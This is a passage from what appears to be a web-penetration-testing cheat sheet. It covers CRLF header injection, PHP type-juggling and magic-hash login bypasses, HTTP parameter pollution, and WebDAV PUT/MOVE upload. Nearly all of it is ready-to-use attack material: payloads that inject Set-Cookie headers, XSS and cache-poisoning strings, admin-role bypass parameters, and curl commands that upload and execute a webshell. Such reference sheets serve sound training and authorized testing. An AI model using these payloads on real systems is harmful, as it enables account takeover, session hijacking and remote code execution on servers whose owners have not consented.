├── Set-Cookie? → ?lang=en%0d%0aSet-Cookie:%20sessionid=ATTACKER
├── Location?   → ?url=https://target%0d%0a%0d%0a<html>... (response split)
├── Other header? → custom header injection
└── No → skip
```

**Payloads:**
```
%0d%0a            # \r\n
%0a               # \n alone (some servers accept)
%E5%98%8A%E5%98%8D # Unicode CRLF bypass (overlong)
%23%0d%0a         # Fragment + CRLF

# Cookie injection
/redirect?url=https://target.com%0d%0aSet-Cookie:%20admin=true

# Header injection + XSS
/page?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0a<html><script>alert(1)</script></html>

# Cache poisoning
/page?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<malicious>
```

## 3.21 - PHP Type Juggling & Magic Hashes
> `==` loose comparison in PHP coerces types → string "0e..." treated as scientific notation 0 → bypass.
> CPTS Web Attacks edge case — common in login + hash comparison code.

```
Decision: PHP backend using == on user-controlled values?
├── md5($input)==md5($secret) with == → magic hash bypass
├── strcmp($a, $b)==0 with array → strcmp returns NULL, NULL==0 → bypass
├── in_array($x, $arr) without strict → "1abc" matches 1
└── No → skip
```

**Magic hash collisions (md5 / sha1 starting with "0e"):**
```
md5("240610708") = 0e462097431906509019562988736854  # numeric → 0
md5("QNKCDZO")  = 0e830400451993494058024219903391  # numeric → 0
sha1("aaroZmOk") = 0e66507019969427134894567494305185566735  # numeric → 0

Login bypass: if(md5($pass) == $stored_hash)
  Stored hash = 0e123... → submit pass "240610708" → both coerce to 0 → match
```

**strcmp() bypass with array:**
```php
// Vulnerable: if (strcmp($_POST['password'], $real_password) == 0)
// strcmp(array, string) returns NULL → NULL == 0 → true
POST: password[]=anything
```

**Other juggling tricks:**
```
"0" == false       → true
"abc" == 0         → true (PHP <8)
"1abc" == 1        → true (PHP <8)
null == 0          → true
[] == false        → true
"0e123" == "0e456" → true (both = 0 scientific)
```

**preg_match() bypass with array:**
```php
// Vulnerable: if (preg_match("/^[a-z]+$/", $_GET['input']))
// preg_match on array returns false → if check inverted bypass
?input[]=admin
```

## 3.22 - HTTP Parameter Pollution (HPP)
> Multiple params with same name → server picks first / last / array / concat differently.
> Used to bypass WAF / sanitization / cause unexpected backend logic.

```
Backend behavior table:
ASP.NET     → first OR concatenated with ","
PHP/Apache  → last
JSP/Tomcat  → first
Node.js     → array
Python/Flask → first
Ruby/Rails  → last
```

**Test:**
```bash
# Send duplicate params, observe response
curl "http://target/page?id=1&id=2"
# WAF on first, app on last → bypass
curl "http://target/login?role=admin&role=user"
```

**Use cases:**
```
WAF bypass:    ?q=safe&q=<script>alert(1)</script>      (WAF checks first, app uses last)
Auth bypass:   ?role=user&role=admin                    (PHP picks last)
Logic abuse:   ?to=victim&to=attacker&amount=100        (multiple recipients)
```

## 3.23 - WebDAV PUT Upload (server-side)
> Misconfigured WebDAV allows PUT — upload webshell directly to webroot.
> Distinct from §10B WebDAV client-side transfer to attacker share.

```
Decision: HTTP OPTIONS shows PUT/MOVE/DELETE methods on web path?
├── Yes → Try PUT upload
│   ├── PUT shell.txt → 201 Created → server allows arbitrary file PUT
│   ├── Direct .php/.asp/.jsp PUT? → 403/415 = filtered
│   └── MOVE bypass: PUT shell.txt → MOVE to shell.php
└── No → skip
```

**Detection:**
```bash
# OPTIONS scan
curl -X OPTIONS -i http://target/path/
# Look for: Allow: GET, POST, PUT, DELETE, MOVE, COPY

# Nmap
nmap --script http-methods --script-args http-methods.url-path='/' -p 80 <target>

# davtest (full WebDAV scanner)
davtest -url http://<target>/path/
# Tests PUT, MOVE, COPY, LOCK with multiple extensions
```

**Exploit — direct PUT:**
```bash
# IIS WebDAV PROPFIND + PUT
cadaver http://<target>/
dav:/> put shell.asp
dav:/> propfind shell.asp

curl -X PUT http://<target>/shell.aspx --data-binary @shell.aspx

# Apache mod_dav with no auth
curl -T shell.php http://<target>/upload/shell.php
curl -X PUT http://<target>/uploads/shell.jsp -d @shell.jsp
```

**Exploit — PUT txt + MOVE to exec extension:**
```bash
# When .php PUT blocked but .txt allowed
curl -T shell.txt http://<target>/uploads/shell.txt
curl -X MOVE -H "Destination: http://<target>/uploads/shell.php" http://<target>/uploads/shell.txt
curl http://<target>/uploads/shell.php?cmd=id
```

**IIS-specific extension trick:**
```bash
# IIS 6.0 ;.txt extension trick (CVE-2009-4444)
curl -T shell.asp;.txt http://<target>/uploads/shell.asp;.txt
# IIS treats as .asp, OS treats as .txt → bypasses filename filter
```

---